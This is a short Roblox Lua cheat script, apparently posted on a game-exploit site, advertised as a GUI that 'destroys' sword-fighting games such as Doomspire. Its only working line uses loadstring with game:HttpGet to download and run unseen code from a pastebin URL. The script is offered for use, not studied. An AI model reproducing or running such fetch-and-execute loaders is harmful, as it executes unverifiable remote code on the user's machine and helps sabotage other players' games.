--[[source: https://robloxscripts.com/destroy-any-sword-fighting-game-gui/
Destroy Any Sword Fighting Game GUI by JR0DGamerz (v3rm poster, creator is unknown).
kills doomspire.
]]
loadstring(game:HttpGet(('https://pastebin.com/raw/Zd7h0Rab'),true))()